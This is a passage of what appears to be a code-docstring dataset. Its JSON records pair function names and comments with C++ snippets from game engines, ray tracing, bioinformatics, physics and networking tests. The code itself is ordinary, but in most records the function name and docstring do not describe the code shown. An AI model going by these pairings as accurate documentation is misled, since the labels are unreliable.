log_info_ptr->buf_ptr += total_num_bytes_per_channel;\\n        }\\n    }\\n\\n    \/* Call the API to commit the log packet *\/\\n    log_commit(log_pkt_ptr);\\n\\n    return result;\\n}'}","id":402}
{"content":"{'function_name': 'InputWndProc', 'docstring': '\/*switch( umessage ) {\\n        \/\/ Keyboard\\n        \/*case WM_KEYUP:\\n            ApplicationHandle->gInput->PushKeyboardState(wparam, false);\\n            return 0;\\n\\n        case WM_KEYDOWN:\\n            \/\/if( (lparam & 0x40000000) == 0 ) \\n            ApplicationHandle->gInput->PushKeyboardState(wparam, true);\\n            return 0;* \/\\n    }*\/', 'code': 'LRESULT CALLBACK WndProc(HWND hwnd, UINT umessage, WPARAM wparam, LPARAM lparam) {\\n#if _DEBUG_BUILD\\n    if( ImGui_ImplWin32_WndProcHandler(hwnd, umessage, wparam, lparam) ) {\\n        return true;\\n    }\\n#endif\\n\\n    MINMAXINFO* info = (MINMAXINFO*)(lparam);\\n\\n    switch( umessage ) {\\n        case WM_CREATE:\\n        {\\n\\n            return 0;\\n        }\\n\\n        \/\/ Check if the window is being destroyed.\\n        case WM_DESTROY:\\n        case WM_CLOSE:\\n        {\\n            PostQuitMessage(0);\\n            return 0;\\n        }\\n\\n        case WM_ERASEBKGND:\\n            return 0;\\n\\n        case WM_GETMINMAXINFO:\\n            \/\/ You should set a minimize window size that is reasonable for your app\\n            info->ptMinTrackSize.x = 380;\\n            info->ptMinTrackSize.y = 200;\\n            return 0;\\n\\n        case WM_SIZE:\\n            \/\/ Window was resized\\n            {\\n                if( ApplicationHandle == nullptr ) return 0;\\n                ApplicationHandle->cfg.CurrentWidth   = LOWORD(lparam);\\n                ApplicationHandle->cfg.CurrentHeight  = HIWORD(lparam);\\n                ApplicationHandle->cfg.CurrentHeight2 = HIWORD(lparam) - 1;\\n                ApplicationHandle->cfg.Resized = true;\\n                return 0;\\n            }\\n\\n            \/\/ Mouse\\n        case WM_INPUT:\\n        {\\n            UINT dwSize;\\n            GetRawInputData((HRAWINPUT)lparam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER));\\n            LPBYTE lpb = new BYTE[dwSize];\\n            if( lpb == NULL ) {\\n                return 0;\\n            }\\n\\n            if( GetRawInputData((HRAWINPUT)lparam, RID_INPUT, lpb, &dwSize, sizeof(RAWINPUTHEADER)) != dwSize )\\n                OutputDebugString(TEXT(\"GetRawInputData does not return correct size !\\\\n\"));\\n\\n            RAWINPUT* raw = (RAWINPUT*)lpb;\\n\\n            if( raw->header.dwType == RIM_TYPEMOUSE ) {\\n                \/\/ Update mouse position\\n                POINT lp; GetCursorPos(&lp);\\n                ScreenToClient(hwnd, &lp);\\n\\n                ApplicationHandle->gInput->GetMouse()->SetMouse((float)lp.x, (float)lp.y);\\n                \\n                \/\/ Update buttons\\n                if( raw->data.mouse.ulButtons > (ULONG)0 ) \\n                    ApplicationHandle->gInput->GetMouse()->SetState(raw->data.mouse.ulButtons);\\n            }\\n\\n            if( raw->header.dwType == RIM_TYPEKEYBOARD ) {\\n                ApplicationHandle->gInput->GetKeyboard()->SetState(raw->data.keyboard.VKey, \\n                                                                   !(raw->data.keyboard.Flags & RI_KEY_BREAK));\\n            }\\n\\n            return DefWindowProc(hwnd, umessage, wparam, lparam);\\n        }\\n    }\\n\\n    \/\/ All other messages\\n    return DefWindowProc(hwnd, umessage, wparam, lparam);\\n}'}","id":404}
{"content":"{'function_name': 'Dictionary_2_System_Collections_ICollection_CopyTo_mCA17F097C0AB36E2660B3A0419A220626E71E930_gshared', 'docstring': '\/\/ end catch (depth: 1)', 'code': 'IL2CPP_METHOD_ATTR void Dictionary_2_System_Collections_IDictionary_set_Item_m09C220E9E92552C476F2391D0D3A4CA5E10684AB_gshared (Dictionary_2_t095125AB3AB90051D8F8A9699F0037539E4DB4E7 * __this, RuntimeObject * ___key0, RuntimeObject * ___value1, const RuntimeMethod* method)\\n{\\n\\tstatic bool s_Il2CppMethodInitialized;\\n\\tif (!s_Il2CppMethodInitialized)\\n\\t{\\n\\t\\til2cpp_codegen_initialize_method (Dictionary_2_System_Collections_IDictionary_set_Item_m09C220E9E92552C476F2391D0D3A4CA5E10684AB_MetadataUsageId);\\n\\t\\ts_Il2CppMethodInitialized = true;\\n\\t}\\n\\tVirtualButtonData_tF16C663C156A49F65553E38299D185C298EFB1BF  V_0;\\n\\tmemset(&V_0, 0, sizeof(V_0));\\n\\tint32_t V_1 = 0;\\n\\tException_t * __last_unhandled_exception = 0;\\n\\tNO_UNUSED_WARNING (__last_unhandled_exception);\\n\\tException_t * __exception_local = 0;\\n\\tNO_UNUSED_WARNING (__exception_local);\\n\\tint32_t __leave_target = -1;\\n\\tNO_UNUSED_WARNING (__leave_target);\\n\\t{\\n\\t\\tRuntimeObject * L_0 = ___key0;\\n\\t\\tif (L_0)\\n\\t\\t{\\n\\t\\t\\tgoto IL_000e;\\n\\t\\t}\\n\\t}\\n\\t{\\n\\t\\tArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD * L_1 = (ArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD *)il2cpp_codegen_object_new(ArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD_il2cpp_TypeInfo_var);\\n\\t\\tArgumentNullException__ctor_mEE0C0D6FCB2D08CD7967DBB1329A0854BBED49ED(L_1, (String_t*)_stringLiteralA62F2225BF70BFACCBC7F1EF2A397836717377DE, \/*hidden argument*\/NULL);\\n\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_1, NULL, Dictionary_2_System_Collections_IDictionary_set_Item_m09C220E9E92552C476F2391D0D3A4CA5E10684AB_RuntimeMethod_var);\\n\\t}\\n\\nIL_000e:\\n\\t{\\n\\t\\tRuntimeObject * L_2 = ___value1;\\n\\t\\tif (L_2)\\n\\t\\t{\\n\\t\\t\\tgoto IL_002c;\\n\\t\\t}\\n\\t}\\n\\t{\\n\\t\\til2cpp_codegen_initobj((&V_0), sizeof(VirtualButtonData_tF16C663C156A49F65553E38299D185C298EFB1BF ));\\n\\t}\\n\\t{\\n\\t\\tArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD * L_4 = (ArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD *)il2cpp_codegen_object_new(ArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD_il2cpp_TypeInfo_var);\\n\\t\\tArgumentNullException__ctor_mEE0C0D6FCB2D08CD7967DBB1329A0854BBED49ED(L_4, (String_t*)_stringLiteralF32B67C7E26342AF42EFABC674D441DCA0A281C5, \/*hidden argument*\/NULL);\\n\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_4, NULL, Dictionary_2_System_Collections_IDictionary_set_Item_m09C220E9E92552C476F2391D0D3A4CA5E10684AB_RuntimeMethod_var);\\n\\t}\\n\\nIL_002c:\\n\\t{\\n\\t}\\n\\nIL_002d:\\n\\ttry\\n\\t{ \/\/ begin try (depth: 1)\\n\\t\\t{\\n\\t\\t\\tRuntimeObject * L_5 = ___key0;\\n\\t\\t\\tV_1 = (int32_t)((*(int32_t*)((int32_t*)UnBox(L_5, IL2CPP_RGCTX_DATA(method->klass->rgctx_data, 27)))));\\n\\t\\t}\\n\\nIL_0034:\\n\\t\\ttry\\n\\t\\t{ \/\/ begin try (depth: 2)\\n\\t\\t\\tint32_t L_6 = V_1;\\n\\t\\t\\tRuntimeObject * L_7 = ___value1;\\n\\t\\t\\tNullCheck((Dictionary_2_t095125AB3AB90051D8F8A9699F0037539E4DB4E7 *)__this);\\n\\t\\t\\t((  void (*) (Dictionary_2_t095125AB3AB90051D8F8A9699F0037539E4DB4E7 *, int32_t, VirtualButtonData_tF16C663C156A49F65553E38299D185C298EFB1BF , const RuntimeMethod*))IL2CPP_RGCTX_METHOD_INFO(method->klass->rgctx_data, 35)->methodPointer)((Dictionary_2_t095125AB3AB90051D8F8A9699F0037539E4DB4E7 *)__this, (int32_t)L_6, (VirtualButtonData_tF16C663C156A49F65553E38299D185C298EFB1BF )((*(VirtualButtonData_tF16C663C156A49F65553E38299D185C298EFB1BF *)((VirtualButtonData_tF16C663C156A49F65553E38299D185C298EFB1BF *)UnBox(L_7, IL2CPP_RGCTX_DATA(method->klass->rgctx_data, 17))))), \/*hidden argument*\/IL2CPP_RGCTX_METHOD_INFO(method->klass->rgctx_data, 35));\\n\\t\\t\\tgoto IL_0064;\\n\\t\\t} \/\/ end try (depth: 2)\\n\\t\\tcatch(Il2CppExceptionWrapper& e)\\n\\t\\t{\\n\\t\\t\\t__exception_local = (Exception_t *)e.ex;\\n\\t\\t\\tif(il2cpp_codegen_class_is_assignable_from (InvalidCastException_t91DF9E7D7FCCDA6C562CB4A9A18903E016680FDA_il2cpp_TypeInfo_var, il2cpp_codegen_object_class(e.ex)))\\n\\t\\t\\t\\tgoto CATCH_0043;\\n\\t\\t\\tthrow e;\\n\\t\\t}\\n\\nCATCH_0043:\\n\\t\\t{ \/\/ begin catch(System.InvalidCastException)\\n\\t\\t\\tRuntimeObject * L_8 = ___value1;\\n\\t\\t\\tRuntimeTypeHandle_t7B542280A22F0EC4EAC2061C29178845847A8B2D  L_9 = { reinterpret_cast<intptr_t> (IL2CPP_RGCTX_TYPE(method->klass->rgctx_data, 36)) };\\n\\t\\t\\tIL2CPP_RUNTIME_CLASS_INIT(Type_t_il2cpp_TypeInfo_var);\\n\\t\\t\\tType_t * L_10 = Type_GetTypeFromHandle_m9DC58ADF0512987012A8A016FB64B068F3B1AFF6((RuntimeTypeHandle_t7B542280A22F0EC4EAC2061C29178845847A8B2D )L_9, \/*hidden argument*\/NULL);\\n\\t\\t\\tString_t* L_11 = SR_Format_m2DD0EA1F52576669B34B03CDB3D441631E1CA76C((String_t*)_stringLiteralFA5354A55A2D5AE97DEF68A54DFDDBF37A452FD6, (RuntimeObject *)L_8, (RuntimeObject *)L_10, \/*hidden argument*\/NULL);\\n\\t\\t\\tArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1 * L_12 = (ArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1 *)il2cpp_codegen_object_new(ArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1_il2cpp_TypeInfo_var);\\n\\t\\t\\tArgumentException__ctor_m26DC3463C6F3C98BF33EA39598DD2B32F0249CA8(L_12, (String_t*)L_11, (String_t*)_stringLiteralF32B67C7E26342AF42EFABC674D441DCA0A281C5, \/*hidden argument*\/NULL);\\n\\t\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_12, NULL, Dictionary_2_System_Collections_IDictionary_set_Item_m09C220E9E92552C476F2391D0D3A4CA5E10684AB_RuntimeMethod_var);\\n\\t\\t} \/\/ end catch (depth: 2)\\n\\nIL_0064:\\n\\t\\t{\\n\\t\\t\\tgoto IL_0087;\\n\\t\\t}\\n\\t} \/\/ end try (depth: 1)\\n\\tcatch(Il2CppExceptionWrapper& e)\\n\\t{\\n\\t\\t__exception_local = (Exception_t *)e.ex;\\n\\t\\tif(il2cpp_codegen_class_is_assignable_from (InvalidCastException_t91DF9E7D7FCCDA6C562CB4A9A18903E016680FDA_il2cpp_TypeInfo_var, il2cpp_codegen_object_class(e.ex)))\\n\\t\\t\\tgoto CATCH_0066;\\n\\t\\tthrow e;\\n\\t}\\n\\nCATCH_0066:\\n\\t{ \/\/ begin catch(System.InvalidCastException)\\n\\t\\tRuntimeObject * L_13 = ___key0;\\n\\t\\tRuntimeTypeHandle_t7B542280A22F0EC4EAC2061C29178845847A8B2D  L_14 = { reinterpret_cast<intptr_t> (IL2CPP_RGCTX_TYPE(method->klass->rgctx_data, 37)) };\\n\\t\\tIL2CPP_RUNTIME_CLASS_INIT(Type_t_il2cpp_TypeInfo_var);\\n\\t\\tType_t * L_15 = Type_GetTypeFromHandle_m9DC58ADF0512987012A8A016FB64B068F3B1AFF6((RuntimeTypeHandle_t7B542280A22F0EC4EAC2061C29178845847A8B2D )L_14, \/*hidden argument*\/NULL);\\n\\t\\tString_t* L_16 = SR_Format_m2DD0EA1F52576669B34B03CDB3D441631E1CA76C((String_t*)_stringLiteralFA5354A55A2D5AE97DEF68A54DFDDBF37A452FD6, (RuntimeObject *)L_13, (RuntimeObject *)L_15, \/*hidden argument*\/NULL);\\n\\t\\tArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1 * L_17 = (ArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1 *)il2cpp_codegen_object_new(ArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1_il2cpp_TypeInfo_var);\\n\\t\\tArgumentException__ctor_m26DC3463C6F3C98BF33EA39598DD2B32F0249CA8(L_17, (String_t*)L_16, (String_t*)_stringLiteralA62F2225BF70BFACCBC7F1EF2A397836717377DE, \/*hidden argument*\/NULL);\\n\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_17, NULL, Dictionary_2_System_Collections_IDictionary_set_Item_m09C220E9E92552C476F2391D0D3A4CA5E10684AB_RuntimeMethod_var);\\n\\t} \/\/ end catch (depth: 1)\\n\\nIL_0087:\\n\\t{\\n\\t\\treturn;\\n\\t}\\n}'}","id":410}
{"content":"{'function_name': 'solution', 'docstring': '\/\/ emplace\uc5d0\uc11c make_pair\ub97c \uc774\uc6a9\ud55c Push\ub85c \uc218\uc815', 'code': 'int main() {\\n    vector<vector<int>> e = { {3, 6},{4, 3},{3, 2},{1, 3},{1, 2},{2, 4},{5, 2}};\\n    int n = 6;\\n    printf(\"%d\\\\n\", solution(n, e));\/\/3\\n    return 0;\\n}'}","id":411}
{"content":"{'function_name': 'evaluate_ambient', 'docstring': '\/\/ iterate over lights and sum up their contribution', 'code': 'glm::vec3 trace_recursive(RenderData & data, Ray const& ray, int depth)\\n{\\n    if (depth > data.context.params.max_depth) {\\n        return glm::vec3(0.f);\\n    }\\n\\n    glm::vec3 contribution(0.f);\\n    Intersection isect;\\n\\n\\tif (!shoot_ray(data, ray, &isect)) {\\n\\t\\treturn glm::vec3(0.f);\\n\\t}\\n\\n    if(depth == 0)\\n\\t\\tdata.isect = isect;\\n\\n    MaterialSample mat = isect.material;\\n\\tif (data.context.params.diffuse_white_mode) {\\n\\t\\tmat.k_a = glm::vec3(0.1f);\\n\\t\\tmat.k_d = glm::vec3(1.0f);\\n\\t\\tmat.k_s = glm::vec3(0.0f);\\n\\t\\tmat.k_r = glm::vec3(0.0f);\\n\\t\\tmat.k_t = glm::vec3(0.0f);\\n\\t}\\n    const glm::vec3 N = isect.normal;\\n    const glm::vec3 V = -ray.direction;\\n    const bool hit_backside = glm::dot(isect.geometric_normal, V) < 0.f;\\n\\n    if (!hit_backside) {\\n\\t\\tif (data.context.params.phong) {\\n\\t\\t\\tcontribution = evaluate_phong(data, mat, isect.position, N, V);\\n\\t\\t}\\n\\t\\telse {\\n\\t\\t\\tcontribution = evaluate_ambient(data, mat, isect.position, N, V);\\n\\t\\t}\\n    }\\n\\n    \/\/ recursive tracing\\n    if (!hit_backside && data.context.params.reflection && glm::length(mat.k_r) > 0.f) {\\n\\t\\tcontribution += mat.k_r * evaluate_reflection(data, depth, isect.position, N, V);\\n    }\\n    if (data.context.params.transmission && glm::length(mat.k_t) > 0.f) {\\n\\t\\tcontribution += mat.k_t * handle_transmissive_material(data, depth, isect.position, N, V, mat.eta);\\n    }\\n\\n    return contribution;\\n}'}","id":419}
{"content":"{'function_name': 'levelwise_LL', 'docstring': '\/\/ gather all nodes of a level->make a LL and return that\\r', 'code': 'vector<int> getTimes(int num, vector<int> time, vector<int> direc){\\r\\n\\tvector<int>ans;\\r\\n\\tvector<int> v(num);\\r\\n\\tfor(int i=0;i<num;i++){\\r\\n\\t\\tv[i]=i;\\r\\n\\t}\\r\\n\\tint d = 1;\/\/exit\\r\\n\\tfor(int i=0;i<num;i++){\\r\\n\\t\\tif(direc[i]==d){\\r\\n\\t\\t\\tans.push_back(v[i]);\\r\\n\\t\\t}else{\\r\\n\\t\\t\\tif(time[i+1]!= i){\\r\\n\\t\\t\\t\\tans.push_back(v[i]);\\r\\n\\t\\t\\t\\td =0;\\r\\n\\t\\t\\t}\\r\\n\\t\\t\\telse if(direc[i+1]==d){\\r\\n\\t\\t\\t\\tans.push_back(v[i+1]);\\r\\n\\t\\t\\t\\tdirec[i+1] = direc[i];\\r\\n\\t\\t\\t\\ttime[i+1] = time[i]+1;\\r\\n\\t\\t\\t\\tv[i+1] = v[i];\\r\\n\\t\\t\\t}\\r\\n\\t\\t}\\r\\n\\t\\tvector<int>::iterator it;\\r\\n\\tfor( it = ans.begin(); it  != ans.end(); it++){\\r\\n        cout << *it << \" \";\\r\\n    }\\r\\n    cout<<endl;\\r\\n\\t}\\r\\n\\treturn ans;\\r\\n}'}","id":430}
{"content":"{'function_name': 'up', 'docstring': '\/\/x\u548c\u7236\u4eb2\u4f4d\u4e8e\u5b83\u4eec\u7236\u4eb2\u7684\u540c\u4fa7 ', 'code': 'void splay(Splay *x,Splay *&root){\/\/\u5c06x\u8282\u70b9\u65cb\u8f6c\u5230root\u8282\u70b9 \\n\\tif(x==null)return;\\n\\twhile(x->fa!=root&&x!=root){\\n\\t\\tup(x);\\n\\t}\\n\\tif(x->fa==root)rotate(root,!is_r(x));\\n}'}","id":433}
{"content":"{'function_name': '_storeAppendRead', 'docstring': '\/\/ if the read is paired', 'code': 'inline void\\n_storeAppendAnnotationName (\\n    FragmentStore<TSpec, TConfig> & fragStore,\\n    TId & annotationId,\\n    TName & annotationName,\\n    TTypeId typeId)\\n{\\n    SEQAN_ASSERT_EQ(length(fragStore.annotationStore), length(fragStore.annotationNameStore));\\n    if (!empty(annotationName) && getIdByName(annotationId, fragStore.annotationNameStoreCache, annotationName))\\n    {\\n        do\\n        {\\n            \/\/ allow different annotations to have the same name (but different typeId)\\n            if (typeId == std::numeric_limits<TTypeId>::max() || fragStore.annotationStore[annotationId].typeId == typeId)\\n                return;\\n            ++annotationId;\\n        } while (annotationId < length(fragStore.annotationNameStore) && fragStore.annotationNameStore[annotationId] == annotationName);\\n    }\\n    \/\/ if the annotation is not in the store yet\\n    \/\/ set the ID on the last entry after appending\\n    annotationId = length(fragStore.annotationNameStore);\\n    \/\/ append to annotationName store\\n    appendName(fragStore.annotationNameStoreCache, annotationName);\\n    \/\/ we also need to append an annotation to store the typeId in case of duplicate annotation names\\n    resize(fragStore.annotationStore, length(fragStore.annotationStore) + 1);\\n    back(fragStore.annotationStore).typeId = typeId;\\n}'}","id":434}
{"content":"{'function_name': 'post', 'docstring': '\/\/ argument, but for invoke we need to pass it manually', 'code': 'hpx::future<void> async_execute(\\n                    queue_function_code_loc_ptr_t<Param>&&\\n                        queue_member_function,\\n                    Param&& args)\\n                {\\n                    \/\/ launching a sycl member function may throw -- if it does put it\\n                    \/\/ into the future\\n                    return hpx::detail::try_catch_exception_ptr(\\n                        [&]() {\\n                            cl::sycl::event e = HPX_INVOKE(\\n                                HPX_FORWARD(\\n                                    queue_function_code_loc_ptr_t<Param>,\\n                                    queue_member_function),\\n                                command_queue, HPX_FORWARD(Param, args),\\n                                cl::sycl::detail::code_location::current());\\n                            return get_future(e);\\n                        },\\n                        [&](std::exception_ptr&& ep) {\\n                            return hpx::make_exceptional_future<void>(\\n                                HPX_MOVE(ep));\\n                        });\\n                }'}","id":436}
{"content":"{'function_name': 'fermiNuclearPotential', 'docstring': '\/\/ Use GSL for the Complete Fermi-Dirac Integrals:', 'code': 'std::vector<double> fermiNuclearDensity_tcN(double t, double c, double Z_norm,\\n                                            const Grid &grid)\\n\/\/ Integrate[ rho(r) , dV ] = Integrate[ 4pi * r^2 * rho(r) , dr ] = Z_norm\\n\/\/ Znorm = Z for nuclear chare density; Z_norm = 1 for nuclear density.\\n{\\n  std::vector<double> rho;\\n  rho.reserve(grid.num_points);\\n\\n  \/\/ form un-normalised rho:\\n  const double a = t \/ FourLn3;\\n  const double coa = c \/ a;\\n  for (const auto r : grid.r) {\\n    const double roa = PhysConst::aB_fm * r \/ a;\\n    const double roc = r \/ c * PhysConst::aB_fm;\\n    if (roc < 10.0) {\\n      rho.push_back(1.0 \/ (1.0 + std::exp(roa - coa)));\\n    } else {\\n      rho.push_back(0.0);\\n    }\\n  }\\n\\n  \/\/ Find rho0, normalisation constant + re-scale (normalise rho)\\n  const double volume_integral =\\n      NumCalc::integrate_any(grid.du, 0, 0, grid.r, grid.r, rho, grid.drdu) *\\n      4.0 * M_PI;\\n  const double rho0 = Z_norm \/ volume_integral;\\n  for (auto &rhoi : rho)\\n    rhoi *= rho0;\\n\\n  return rho;\\n}'}","id":437}
{"content":"{'function_name': 'Dictionary_2_Do_ICollectionCopyTo_TisIl2CppObject_m4092802079_gshared', 'docstring': '\/\/ end catch (depth: 1)', 'code': 'KeyValuePair_2_t1944347872  Enumerable_ElementAt_TisKeyValuePair_2_t1944347872_m3938121157_gshared (Il2CppObject * __this \/* static, unused *\/, Il2CppObject* ___source, int32_t ___index, int32_t ___fallback, const MethodInfo* method)\\n{\\n\\tstatic bool s_Il2CppMethodIntialized;\\n\\tif (!s_Il2CppMethodIntialized)\\n\\t{\\n\\t\\til2cpp_codegen_initialize_method (Enumerable_ElementAt_TisKeyValuePair_2_t1944347872_m3938121157_MetadataUsageId);\\n\\t\\ts_Il2CppMethodIntialized = true;\\n\\t}\\n\\tint64_t V_0 = 0;\\n\\tKeyValuePair_2_t1944347872  V_1;\\n\\tmemset(&V_1, 0, sizeof(V_1));\\n\\tIl2CppObject* V_2 = NULL;\\n\\tKeyValuePair_2_t1944347872  V_3;\\n\\tmemset(&V_3, 0, sizeof(V_3));\\n\\tKeyValuePair_2_t1944347872  V_4;\\n\\tmemset(&V_4, 0, sizeof(V_4));\\n\\tException_t1145979430 * __last_unhandled_exception = 0;\\n\\tNO_UNUSED_WARNING (__last_unhandled_exception);\\n\\tException_t1145979430 * __exception_local = 0;\\n\\tNO_UNUSED_WARNING (__exception_local);\\n\\tint32_t __leave_target = 0;\\n\\tNO_UNUSED_WARNING (__leave_target);\\n\\t{\\n\\t\\tV_0 = (int64_t)(((int64_t)((int64_t)0)));\\n\\t\\tIl2CppObject* L_0 = ___source;\\n\\t\\tNullCheck((Il2CppObject*)L_0);\\n\\t\\tIl2CppObject* L_1 = InterfaceFuncInvoker0< Il2CppObject* >::Invoke(0 \/* System.Collections.Generic.IEnumerator`1<!0> System.Collections.Generic.IEnumerable`1<System.Collections.Generic.KeyValuePair`2<System.Object,System.Object>>::GetEnumerator() *\/, IL2CPP_RGCTX_DATA(method->rgctx_data, 0), (Il2CppObject*)L_0);\\n\\t\\tV_2 = (Il2CppObject*)L_1;\\n\\t}\\n\\nIL_000a:\\n\\ttry\\n\\t{ \/\/ begin try (depth: 1)\\n\\t\\t{\\n\\t\\t\\tgoto IL_002a;\\n\\t\\t}\\n\\nIL_000f:\\n\\t\\t{\\n\\t\\t\\tIl2CppObject* L_2 = V_2;\\n\\t\\t\\tNullCheck((Il2CppObject*)L_2);\\n\\t\\t\\tKeyValuePair_2_t1944347872  L_3 = InterfaceFuncInvoker0< KeyValuePair_2_t1944347872  >::Invoke(0 \/* !0 System.Collections.Generic.IEnumerator`1<System.Collections.Generic.KeyValuePair`2<System.Object,System.Object>>::get_Current() *\/, IL2CPP_RGCTX_DATA(method->rgctx_data, 1), (Il2CppObject*)L_2);\\n\\t\\t\\tV_1 = (KeyValuePair_2_t1944347872 )L_3;\\n\\t\\t\\tint32_t L_4 = ___index;\\n\\t\\t\\tint64_t L_5 = V_0;\\n\\t\\t\\tint64_t L_6 = (int64_t)L_5;\\n\\t\\t\\tV_0 = (int64_t)((int64_t)((int64_t)L_6+(int64_t)(((int64_t)((int64_t)1)))));\\n\\t\\t\\tif ((!(((uint64_t)(((int64_t)((int64_t)L_4)))) == ((uint64_t)L_6))))\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_002a;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_0023:\\n\\t\\t{\\n\\t\\t\\tKeyValuePair_2_t1944347872  L_7 = V_1;\\n\\t\\t\\tV_3 = (KeyValuePair_2_t1944347872 )L_7;\\n\\t\\t\\tIL2CPP_LEAVE(0x5D, FINALLY_003a);\\n\\t\\t}\\n\\nIL_002a:\\n\\t\\t{\\n\\t\\t\\tIl2CppObject* L_8 = V_2;\\n\\t\\t\\tNullCheck((Il2CppObject *)L_8);\\n\\t\\t\\tbool L_9 = InterfaceFuncInvoker0< bool >::Invoke(1 \/* System.Boolean System.Collections.IEnumerator::MoveNext() *\/, IEnumerator_t3037427797_il2cpp_TypeInfo_var, (Il2CppObject *)L_8);\\n\\t\\t\\tif (L_9)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_000f;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_0035:\\n\\t\\t{\\n\\t\\t\\tIL2CPP_LEAVE(0x45, FINALLY_003a);\\n\\t\\t}\\n\\t} \/\/ end try (depth: 1)\\n\\tcatch(Il2CppExceptionWrapper& e)\\n\\t{\\n\\t\\t__last_unhandled_exception = (Exception_t1145979430 *)e.ex;\\n\\t\\tgoto FINALLY_003a;\\n\\t}\\n\\nFINALLY_003a:\\n\\t{ \/\/ begin finally (depth: 1)\\n\\t\\t{\\n\\t\\t\\tIl2CppObject* L_10 = V_2;\\n\\t\\t\\tif (L_10)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_003e;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_003d:\\n\\t\\t{\\n\\t\\t\\tIL2CPP_END_FINALLY(58)\\n\\t\\t}\\n\\nIL_003e:\\n\\t\\t{\\n\\t\\t\\tIl2CppObject* L_11 = V_2;\\n\\t\\t\\tNullCheck((Il2CppObject *)L_11);\\n\\t\\t\\tInterfaceActionInvoker0::Invoke(0 \/* System.Void System.IDisposable::Dispose() *\/, IDisposable_t1786818228_il2cpp_TypeInfo_var, (Il2CppObject *)L_11);\\n\\t\\t\\tIL2CPP_END_FINALLY(58)\\n\\t\\t}\\n\\t} \/\/ end finally (depth: 1)\\n\\tIL2CPP_CLEANUP(58)\\n\\t{\\n\\t\\tIL2CPP_JUMP_TBL(0x5D, IL_005d)\\n\\t\\tIL2CPP_JUMP_TBL(0x45, IL_0045)\\n\\t\\tIL2CPP_RETHROW_IF_UNHANDLED(Exception_t1145979430 *)\\n\\t}\\n\\nIL_0045:\\n\\t{\\n\\t\\tint32_t L_12 = ___fallback;\\n\\t\\tif ((!(((uint32_t)L_12) == ((uint32_t)1))))\\n\\t\\t{\\n\\t\\t\\tgoto IL_0052;\\n\\t\\t}\\n\\t}\\n\\t{\\n\\t\\tArgumentOutOfRangeException_t1666784219 * L_13 = (ArgumentOutOfRangeException_t1666784219 *)il2cpp_codegen_object_new(ArgumentOutOfRangeException_t1666784219_il2cpp_TypeInfo_var);\\n\\t\\tArgumentOutOfRangeException__ctor_m15523695(L_13, \/*hidden argument*\/NULL);\\n\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_13);\\n\\t}\\n\\nIL_0052:\\n\\t{\\n\\t\\tInitobj (KeyValuePair_2_t1944347872_il2cpp_TypeInfo_var, (&V_4));\\n\\t\\tKeyValuePair_2_t1944347872  L_14 = V_4;\\n\\t\\treturn L_14;\\n\\t}\\n\\nIL_005d:\\n\\t{\\n\\t\\tKeyValuePair_2_t1944347872  L_15 = V_3;\\n\\t\\treturn L_15;\\n\\t}\\n}'}","id":440}
{"content":"{'function_name': 'req_parser', 'docstring': '\/\/    } while(iss);', 'code': 'ssize_t  read_index(const char* fname, std::string *data){\\n\\n    std::string b; \/\/ = std::string(\"\");\\n    std::stringstream buffer;\\n\\n    std::ifstream f (fname, ios::in);\\n\\n    if(f.is_open()){\\n        \\n        buffer << f.rdbuf();\\n        data->assign(buffer.str());\\n\\n        f.close();\\n        \\n        b = \"HTTP\/1.0 200 OK\\\\r\\\\n\"\\n             \"Content-length: \";\\n        b+=std::to_string(data->size());\\n        b+=\"\\\\r\\\\n\"\\n            \"Connection: close\\\\r\\\\n\"\\n            \"Content-Type: text\/html\\\\r\\\\n\"\\n            \"\\\\r\\\\n\";\\n        b+=data->c_str();\\n    }\\n    else {\\n        b = (char *) not_found;\\n    }\\n\\n        data->assign(b);\\n        \\n    return b.size();\\n}'}","id":444}
{"content":"{'function_name': 'TEST_F', 'docstring': '\/\/ Note: Changing SRTO_FC changes SRTO_RCVBUF limitation', 'code': 'TEST_F(TestSocketOptions, RestrictionCallerConnecting)\\n{\\n    \/\/ The default SRTO_CONNTIMEO is 3 seconds. It is assumed all socket options could be checked.\\n    auto connect_async = [this]() {\\n        return Connect();\\n    };\\n    auto connect_res = async(launch::async, connect_async);\\n\\n    for (int i = 0; i < 100; ++i)\\n    {\\n        if (srt_getsockstate(m_caller_sock) == SRTS_CONNECTING)\\n            break;\\n\\n        this_thread::sleep_for(chrono::microseconds(100));\\n    }\\n\\n    cout << \"Running test\\\\n\";\\n\\n    for (const auto& entry : g_test_matrix_options)\\n    {\\n        if (entry.restriction != RestrictionType::PRE)\\n            continue;\\n\\n        \/\/ Setting a valid minimum value\\n        EXPECT_EQ(srt_setsockopt(m_caller_sock, 0, entry.optid, &entry.min_val, entry.opt_len), SRT_ERROR)\\n            << \"Setting \" << entry.optname << \" (PRE) must not succeed while connecting. Sock state: \" << g_socket_state[srt_getsockstate(m_caller_sock)];\\n    }\\n\\n    connect_res.get();\\n}'}","id":445}
